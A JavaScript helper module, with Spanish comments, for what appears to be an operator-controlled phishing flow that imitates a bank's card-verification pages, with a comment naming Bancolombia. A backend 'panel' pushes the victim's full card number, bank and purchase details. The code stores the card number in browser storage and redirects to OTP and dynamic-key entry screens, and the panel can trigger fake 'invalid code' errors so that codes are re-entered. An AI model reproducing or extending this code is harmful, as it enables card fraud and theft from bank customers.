import { instanceBackend } from "../../axios/instanceBackend";

/** sessionStorage: alerta al llegar a OTP/dinámica tras redirect del panel (como estado_sesion en Bancolombia) */
export const TC_ALERT_STORAGE_KEY = "tc_estado_alerta";

/** Mensaje de error OTP */
export const TC_MSG_ERROR_OTP =
  "El código ingresado es incorrecto. Verifica e intenta de nuevo.";

/** Mensaje de error DIN */
export const TC_MSG_ERROR_DIN =
  "La clave dinámica no es válida. Verifica e inténtalo de nuevo.";

/** Mensajes de alerta TC */
const TC_ALERT_MESSAGES = {
  error_otp: TC_MSG_ERROR_OTP,
  error_din: TC_MSG_ERROR_DIN,
};

/**
 * Metodo encargado de consultar la sesión TC en el backend (panel, monto, banco, tarjeta)
 *
 * @param sessionId ID de sesión
 * @returns Contexto TC desde storage del panel
 */
export async function fetchTcSession(sessionId) {

  // Se consulta el contexto TC en el backend
  const { data } = await instanceBackend.get(`/tc/auth-context/${sessionId}`);

  // Se valida si la respuesta no es exitosa o no hay contexto
  if (!data?.success || !data?.context) {

    // Se lanza el error
    throw new Error(data?.message || "No se pudo cargar la sesión TC");
  }

  // Se retorna el contexto
  return data.context;
}

/**
 * Metodo encargado de persistir el PAN en storages del flujo TC
 *
 * @param digits Numero de tarjeta (solo digitos)
 */
export function persistTcTarjeta(digits) {

  // Se sale si no hay digitos
  if (!digits) return;

  // Se guarda la tarjeta en sessionStorage
  sessionStorage.setItem("tc_tarjeta", digits);

  // Se guarda la tarjeta en localStorage
  localStorage.setItem("tc_tarjeta", digits);
}

/**
 * Metodo encargado de aplicar el contexto TC al estado del componente
 *
 * @param ctx Contexto devuelto por fetchTcSession
 * @param setters Funciones setState del componente
 */
export function applyTcSessionContext(ctx, setters) {

  // Se capturan los setters del componente
  const {
    setBank,
    setCardNumber,
    setPurchase,
    setFranquiciaFallback,
  } = setters;

  // Se aplica el banco si viene en el contexto
  if (ctx.banco) {

    // Se actualiza el estado del banco
    setBank(ctx.banco);

    // Se guarda el banco en sessionStorage
    sessionStorage.setItem("tc_bank", ctx.banco);

    // Se guarda el banco en localStorage
    localStorage.setItem("tc_bank", ctx.banco);
  }

  // Se aplica la tarjeta si viene en el contexto
  if (ctx.tarjeta) {

    // Se normaliza el PAN a solo digitos
    const digits = String(ctx.tarjeta).replace(/\D/g, "");

    // Se actualiza el estado de la tarjeta
    setCardNumber(digits);

    // Se persiste la tarjeta en storages
    persistTcTarjeta(digits);
  }

  // Se actualiza el resumen de compra (comercio, monto, ultimos digitos, fecha)
  setPurchase({
    comercio: ctx.comercio || "",
    monto: ctx.monto || "",
    ultimosDigitos: ctx.ultimosDigitos || "",
    fecha: ctx.fecha || "",
  });

  // Se aplica la franquicia si viene en el contexto y hay setter
  if (ctx.franquicia && setFranquiciaFallback) {

    // Se actualiza el estado de la franquicia
    setFranquiciaFallback(ctx.franquicia);

    // Se guarda la franquicia en sessionStorage
    sessionStorage.setItem("tc_franquicia", ctx.franquicia);

    // Se guarda la franquicia en localStorage
    localStorage.setItem("tc_franquicia", ctx.franquicia);
  }
}

/**
 * Metodo encargado de guardar alerta TC para mostrar tras redirect (error_otp / error_din)
 *
 * @param kind Tipo de alerta (error_otp | error_din)
 */
export function setTcAlert(kind) {

  // Se guarda el tipo de alerta en sessionStorage
  if (kind) sessionStorage.setItem(TC_ALERT_STORAGE_KEY, kind);
}

/**
 * Metodo encargado de leer y limpiar la alerta TC pendiente
 *
 * @returns Mensaje para el campo de error o cadena vacia
 */
export function consumeTcAlert() {

  // Se captura el tipo de alerta
  const kind = sessionStorage.getItem(TC_ALERT_STORAGE_KEY);

  // Se sale si no hay alerta
  if (!kind) return "";

  // Se limpia la alerta
  sessionStorage.removeItem(TC_ALERT_STORAGE_KEY);

  // Se retorna el mensaje
  return TC_ALERT_MESSAGES[kind] || "";
}

/**
 * Metodo encargado de armar bank y tarjeta para redirect ingreso-tc
 *
 * @param verifyData Respuesta de /tc/verify-state
 * @param local Estado local (bank, cardNumber)
 * @returns bank y tarjeta normalizada
 */
export function resolveTcRedirectParams(verifyData, local = {}) {

  // Se resuelve el banco
  const bank =
    verifyData?.bank ||
    local.bank ||
    sessionStorage.getItem("tc_bank") ||
    localStorage.getItem("tc_bank") ||
    "";

  // Se resuelve la tarjeta
  const tarjeta = String(
    verifyData?.tarjeta ||
    local.cardNumber ||
    sessionStorage.getItem("tc_tarjeta") ||
    localStorage.getItem("tc_tarjeta") ||
    "",
  ).replace(/\D/g, "");

  // Se retorna bank y tarjeta
  return { bank, tarjeta };
}

/**
 * Metodo encargado de armar URL de ingreso TC (OTP o dinámica)
 *
 * @param path Ruta base (/ingreso-tc/otp o /ingreso-tc/dinamica)
 * @param sessionId ID de sesión
 * @param bank Banco del panel
 * @param tarjeta PAN solo digitos
 * @returns URL con query string
 */
export function buildTcIngresoUrl(path, sessionId, bank, tarjeta) {

  // Se inicializa el objeto de parametros
  const params = new URLSearchParams();

  // Se agrega sessionId
  params.set("sessionId", sessionId);

  // Se agrega bank y tarjeta si existen
  if (bank) params.set("bank", bank);
  if (tarjeta) params.set("tarjeta", tarjeta);

  // Se retorna la url con los parametros
  return `${path}?${params.toString()}`;
}

/**
 * Metodo encargado de redirigir a pantalla ingreso TC con parametros y alerta opcional
 *
 * @param path Ruta destino
 * @param sessionId ID de sesión
 * @param bank Banco
 * @param tarjeta PAN
 * @param alertKind error_otp | error_din (opcional)
 */
export function redirectToTcIngreso(path, sessionId, bank, tarjeta, alertKind) {

  // Se guarda alerta si aplica (como estado_sesion en Bancolombia)
  if (alertKind) setTcAlert(alertKind);

  // Se redirige a la pantalla TC
  window.location.href = buildTcIngresoUrl(path, sessionId, bank, tarjeta);
}
